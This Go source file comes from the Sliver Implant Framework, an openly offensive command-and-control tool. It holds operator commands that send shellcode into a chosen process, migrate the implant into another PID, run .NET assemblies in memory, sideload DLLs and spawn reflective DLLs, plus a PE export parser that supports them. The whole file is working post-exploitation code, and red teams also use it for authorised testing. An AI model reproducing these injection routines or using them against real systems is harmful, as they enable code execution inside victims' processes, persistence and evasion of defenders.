package command

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/bishopfox/sliver/client/spin"
	clientpb "github.com/bishopfox/sliver/protobuf/client"
	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func executeShellcode(ctx *grumble.Context, rpc RPCServer) {

	activeSliver := ActiveSliver.Sliver
	if activeSliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) != 1 {
		fmt.Printf(Warn + "You must provide a path to the shellcode\n")
		return
	}
	pid := ctx.Flags.Uint("pid")
	shellcodePath := ctx.Args[0]
	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
	if err != nil {
		fmt.Printf(Warn+"Error: %s\n", err.Error())
	}
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", activeSliver.Name)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&clientpb.TaskReq{
		Data:     shellcodeBin,
		SliverID: ActiveSliver.Sliver.ID,
		RwxPages: ctx.Flags.Bool("rwx-pages"),
		Pid:      uint32(pid),
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgTask,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
	}
	fmt.Printf(Info + "Executed payload on target\n")
}

func migrate(ctx *grumble.Context, rpc RPCServer) {
	activeSliver := ActiveSliver.Sliver
	if activeSliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) != 1 {
		fmt.Printf(Warn + "You must provide a PID to migrate to")
		return
	}

	pid, err := strconv.Atoi(ctx.Args[0])
	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
	}
	config := getActiveSliverConfig()
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Migrating into %d ...", pid)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&clientpb.MigrateReq{
		Pid:      uint32(pid),
		Config:   config,
		SliverID: ActiveSliver.Sliver.ID,
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgMigrate,
		Data: data,
	}, 45*time.Minute)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
	} else {
		fmt.Printf("\n"+Info+"Successfully migrated to %d\n", pid)
	}
}

func getActiveSliverConfig() *clientpb.SliverConfig {
	activeSliver := ActiveSliver.Sliver
	c2s := []*clientpb.SliverC2{}
	c2s = append(c2s, &clientpb.SliverC2{
		URL:      activeSliver.ActiveC2,
		Priority: uint32(0),
	})
	config := &clientpb.SliverConfig{
		GOOS:   activeSliver.GetOS(),
		GOARCH: activeSliver.GetArch(),
		Debug:  true,

		MaxConnectionErrors: uint32(1000),
		ReconnectInterval:   uint32(60),

		Format:      clientpb.SliverConfig_SHELLCODE,
		IsSharedLib: true,
		C2:          c2s,
	}
	return config
}

func executeAssembly(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) < 1 {
		fmt.Printf(Warn + "Please provide valid arguments.\n")
		return
	}
	cmdTimeout := time.Duration(ctx.Flags.Int("timeout")) * time.Second
	assemblyBytes, err := ioutil.ReadFile(ctx.Args[0])
	if err != nil {
		fmt.Printf(Warn+"%s", err.Error())
		return
	}

	assemblyArgs := ""
	if len(ctx.Args) == 2 {
		assemblyArgs = ctx.Args[1]
	}
	process := ctx.Flags.String("process")

	ctrl := make(chan bool)
	go spin.Until("Executing assembly ...", ctrl)
	data, _ := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
		SliverID:   ActiveSliver.Sliver.ID,
		Timeout:    int32(ctx.Flags.Int("timeout")),
		Arguments:  assemblyArgs,
		Process:    process,
		Assembly:   assemblyBytes,
		HostingDll: []byte{},
	})

	resp := <-rpc(&sliverpb.Envelope{
		Data: data,
		Type: clientpb.MsgExecuteAssemblyReq,
	}, cmdTimeout)
	ctrl <- true
	<-ctrl
	execResp := &sliverpb.ExecuteAssembly{}
	proto.Unmarshal(resp.Data, execResp)
	if execResp.Error != "" {
		fmt.Printf(Warn+"%s", execResp.Error)
		return
	}
	fmt.Printf("\n"+Info+"Assembly output:\n%s", execResp.Output)
}

// sideload --process --get-output PATH_TO_DLL EntryPoint Args...
func sideloadDll(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	var args []string
	if len(ctx.Args) < 2 {
		fmt.Printf(Warn + "See `help sideload` for usage.")
		return
	} else if len(ctx.Args) > 3 {
		args = append(args, ctx.Args[2:]...)
	}

	binPath := ctx.Args[0]
	entryPoint := ctx.Args[1]

	processName := ctx.Flags.String("process")

	cmdTimeout := time.Duration(ctx.Flags.Int("timeout")) * time.Second
	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		fmt.Printf(Warn+"%s", err.Error())
		return
	}
	ctrl := make(chan bool)
	go spin.Until(fmt.Sprintf("Sideloading %s ...", binPath), ctrl)
	data, _ := proto.Marshal(&clientpb.SideloadReq{
		Data:       binData,
		Args:       strings.Join(args, " "),
		ProcName:   processName,
		EntryPoint: entryPoint,
		SliverID:   ActiveSliver.Sliver.ID,
	})

	resp := <-rpc(&sliverpb.Envelope{
		Data: data,
		Type: clientpb.MsgSideloadReq,
	}, cmdTimeout)
	ctrl <- true
	<-ctrl
	execResp := &sliverpb.Sideload{}
	proto.Unmarshal(resp.Data, execResp)
	if execResp.Error != "" {
		fmt.Printf(Warn+"%s", execResp.Error)
		return
	}
	if len(execResp.Result) > 0 {
		fmt.Printf("\n"+Info+"Output:\n%s", execResp.Result)
	}
}

// spawnDll --process --export  PATH_TO_DLL Args...
func spawnDll(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	var args string
	if len(ctx.Args) < 1 {
		fmt.Printf(Warn + "See `help spawndll` for usage.")
		return
	} else if len(ctx.Args) > 1 {
		args = ctx.Args[1]
	}

	binPath := ctx.Args[0]
	processName := ctx.Flags.String("process")
	exportName := ctx.Flags.String("export")
	offset, err := getExportOffset(binPath, exportName)
	if err != nil {
		fmt.Printf(Warn+"%s", err.Error())
		return
	}

	cmdTimeout := time.Duration(ctx.Flags.Int("timeout")) * time.Second
	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		fmt.Printf(Warn+"%s", err.Error())
		return
	}
	ctrl := make(chan bool)
	go spin.Until(fmt.Sprintf("Executing reflective dll %s", binPath), ctrl)
	data, _ := proto.Marshal(&sliverpb.SpawnDllReq{
		Data:     binData,
		Args:     args,
		ProcName: processName,
		Offset:   offset,
		SliverID: ActiveSliver.Sliver.ID,
	})

	resp := <-rpc(&sliverpb.Envelope{
		Data: data,
		Type: sliverpb.MsgSpawnDllReq,
	}, cmdTimeout)
	ctrl <- true
	<-ctrl
	execResp := &sliverpb.SpawnDll{}
	proto.Unmarshal(resp.Data, execResp)
	if execResp.Error != "" {
		fmt.Printf(Warn+"%s", execResp.Error)
		return
	}
	if len(execResp.Result) > 0 {
		fmt.Printf("\n"+Info+"Output:\n%s", execResp.Result)
	}
}

// ExportDirectory - stores the Export data
type ExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32 // RVA from base of image
	AddressOfNames        uint32 // RVA from base of image
	AddressOfNameOrdinals uint32 // RVA from base of image
}

func rvaToFoa(rva uint32, pefile *pe.File) uint32 {
	var offset uint32
	for _, section := range pefile.Sections {
		if rva >= section.SectionHeader.VirtualAddress && rva <= section.SectionHeader.VirtualAddress+section.SectionHeader.Size {
			offset = section.SectionHeader.Offset + (rva - section.SectionHeader.VirtualAddress)
		}
	}
	return offset
}

func getFuncName(index uint32, rawData []byte, fpe *pe.File) string {
	nameRva := binary.LittleEndian.Uint32(rawData[index:])
	nameFOA := rvaToFoa(nameRva, fpe)
	funcNameBytes, err := bytes.NewBuffer(rawData[nameFOA:]).ReadBytes(0)
	if err != nil {
		log.Fatal(err)
		return ""
	}
	funcName := string(funcNameBytes[:len(funcNameBytes)-1])
	return funcName
}

func getOrdinal(index uint32, rawData []byte, fpe *pe.File, funcArrayFoa uint32) uint32 {
	ordRva := binary.LittleEndian.Uint16(rawData[index:])
	funcArrayIndex := funcArrayFoa + uint32(ordRva)*8
	funcRVA := binary.LittleEndian.Uint32(rawData[funcArrayIndex:])
	funcOffset := rvaToFoa(funcRVA, fpe)
	return funcOffset
}

func getExportOffset(filepath string, exportName string) (funcOffset uint32, err error) {
	rawData, err := ioutil.ReadFile(filepath)
	if err != nil {
		return 0, err
	}
	handle, err := os.Open(filepath)
	if err != nil {
		return 0, err
	}
	defer handle.Close()
	fpe, _ := pe.NewFile(handle)
	exportDirectoryRVA := fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	var offset = rvaToFoa(exportDirectoryRVA, fpe)
	exportDir := ExportDirectory{}
	buff := &bytes.Buffer{}
	buff.Write(rawData[offset:])
	err = binary.Read(buff, binary.LittleEndian, &exportDir)
	if err != nil {
		return 0, err
	}
	current := exportDir.AddressOfNames
	nameArrayFOA := rvaToFoa(exportDir.AddressOfNames, fpe)
	ordinalArrayFOA := rvaToFoa(exportDir.AddressOfNameOrdinals, fpe)
	funcArrayFoa := rvaToFoa(exportDir.AddressOfFunctions, fpe)

	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		index := nameArrayFOA + i*8
		name := getFuncName(index, rawData, fpe)
		if strings.Contains(name, exportName) {
			ordIndex := ordinalArrayFOA + i*2
			funcOffset = getOrdinal(ordIndex, rawData, fpe, funcArrayFoa)
		}
		current += uint32(binary.Size(i))
	}

	return
}
